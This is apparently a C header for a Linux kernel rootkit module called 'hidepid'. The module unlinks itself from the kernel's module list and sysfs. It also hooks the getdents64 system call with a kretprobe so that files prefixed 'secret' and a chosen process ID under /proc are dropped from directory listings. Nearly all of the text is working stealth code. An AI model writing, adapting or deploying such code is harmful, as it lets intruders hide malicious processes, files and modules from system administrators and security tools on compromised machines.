#ifndef HIDEPID_H
#define HIDEPID_H


#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/random.h>

#define HIDE_PREFIX          "secret"
#define PROC_ROOT_INO        1
#define log_info(...) {pr_info(__VA_ARGS__); }

static int hidden_kthread_pid = -1;
static char hidden_kthread_pid_string[16];

static void set_pid_to_ban(int pid) {
    hidden_kthread_pid = pid;
    snprintf(hidden_kthread_pid_string, sizeof(hidden_kthread_pid_string), "%d", hidden_kthread_pid);
}

void hide_module_from_proc(void)
{
	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
}

/* Helper to check if we're listing /proc */

static bool is_proc_fd(int fd)
{
    struct fd f = fdget(fd);
    bool result = false;

    if (!f.file)
        return false;

    /* Use on-stack buffer to avoid allocation */
    char buf[PATH_MAX];
    char *path = d_path(&f.file->f_path, buf, sizeof(buf));
    if (!IS_ERR(path) && strcmp(path, "/proc") == 0) {
        result = true;
    }
    fdput(f);
    return result;
}

static int must_be_filtered(unsigned int fd, const char* line, unsigned int line_length) {
    char* hidden_files = HIDE_PREFIX;
    unsigned int prefix_len = strlen(hidden_files);
    if(line_length >= prefix_len && strncmp(line, hidden_files, prefix_len) == 0) {
        log_info("Filtered fd=%d, line_length=%d, line='%s'\n", fd, line_length, line);
        return 1;
    };

    if(is_proc_fd(fd)) {
        hidden_files = hidden_kthread_pid_string;
        prefix_len = strlen(hidden_files);
        if(line_length >= prefix_len && strncmp(line, hidden_files, prefix_len) == 0) {
            log_info("Filtered proc fd=%d, line_length=%d, line='%s'\n", fd, line_length, line);
            return 1;
        };
    }
    return 0;
}

typedef struct {
    long int fd;
    struct linux_dirent *dirent;
    unsigned long buf_size;
} getdents64_data;

static int __kprobes entry_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    getdents64_data* data = (getdents64_data*) ri->data;
    regs = (struct pt_regs*)regs->di;

    data->fd = regs->di;
    data->dirent= regs->si;
    data->buf_size = regs->dx;

    return 0;
}

static int __kprobes ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    getdents64_data* data = (getdents64_data*) ri->data;

    unsigned long bytes_read = regs->ax;
    if(bytes_read == 0) {
        return 0;
    }

    // --- Begin filter implementation ---
    // Allocate kernel buffer to hold the original dirent data
    char *kbuf = kmalloc(bytes_read, GFP_KERNEL);
    if (!kbuf) {
        log_info("filter: kmalloc for kbuf failed\n");
        return 0;
    }

    // Copy original buffer from user space
    if (copy_from_user(kbuf, data->dirent, bytes_read)) {
        log_info("filter: copy_from_user failed\n");
        kfree(kbuf);
        return 0;
    }

    // Allocate buffer for filtered entries (max same size)
    char *new_kbuf = kmalloc(bytes_read, GFP_KERNEL);
    if (!new_kbuf) {
        log_info("filter: kmalloc for new_kbuf failed\n");
        kfree(kbuf);
        return 0;
    }

    char *cur = kbuf;
    char *new_cur = new_kbuf;
    unsigned long *prev_doff_ptr = NULL;  // pointer to d_off field of last kept entry in new buffer
    unsigned long pending_cookie = 0;     // d_off from hidden entry that should become the new offset for previous kept entry

    while (cur < kbuf + bytes_read) {
        struct linux_dirent64 *entry = (struct linux_dirent64 *)cur;
        unsigned short reclen = entry->d_reclen;
        char *name = entry->d_name;
        int name_len = strlen(name); //reclen - sizeof(struct linux_dirent64);

        // Check if filename starts with HIDE_PREFIX
        int hide = must_be_filtered(data->fd, name, name_len);

        if (hide) {
            // Remember this entry's d_off (cookie for next entry) for later update
            pending_cookie = entry->d_off;
            // Do NOT copy this entry
        } else {
            // If we have a pending cookie from skipped entries, update previous kept entry's d_off
            if (pending_cookie != 0 && prev_doff_ptr) {
                *prev_doff_ptr = pending_cookie;
                pending_cookie = 0;
            }
            // Copy the whole entry to the new buffer
            memcpy(new_cur, cur, reclen);
            // Save pointer to the d_off field of this newly copied entry
            prev_doff_ptr = (unsigned long *)&((struct linux_dirent64 *)new_cur)->d_off;
            new_cur += reclen;
        }
        cur += reclen;
    }

    // If the last entries were hidden, update the last kept entry's d_off
    if (pending_cookie != 0 && prev_doff_ptr) {
        *prev_doff_ptr = pending_cookie;
    }

    unsigned long new_len = new_cur - new_kbuf;

    // Write back the filtered buffer
    if (copy_to_user(data->dirent, new_kbuf, new_len)) {
        log_info("filter: copy_to_user failed\n");
    } else {
        // Update the syscall return value to the new buffer size
        regs->ax = new_len;
        // log_info("filter: removed entries, new size=%lu\n", new_len);
    }

    kfree(kbuf);
    kfree(new_kbuf);
    // --- End filter implementation ---

    return 0;
}

static struct kretprobe krp = {
    .kp.symbol_name = "__x64_sys_getdents64",
    .handler = ret_handler,
    .entry_handler = entry_handler,
    .maxactive = 20,  /* число одновременных вызовов */
    .data_size = sizeof(getdents64_data)
};

/* Module initialization */
static int hidepid_init(void)
{
    int ret;

    ret = register_kretprobe(&krp);
    if (ret != 0) {
        printk(KERN_ERR "hidepid: failed to register kretprobe on %s (error %d)\n",
               krp.kp.symbol_name, ret);
        return ret;
    }
    printk(KERN_INFO "hidepid: kprobe registered on %s\n", krp.kp.symbol_name);
    return 0;
}

/* Module cleanup */
static void hidepid_exit(void)
{
    unregister_kretprobe(&krp);
    printk(KERN_INFO "hidepid: kprobe unregistered\n");
}


#endif
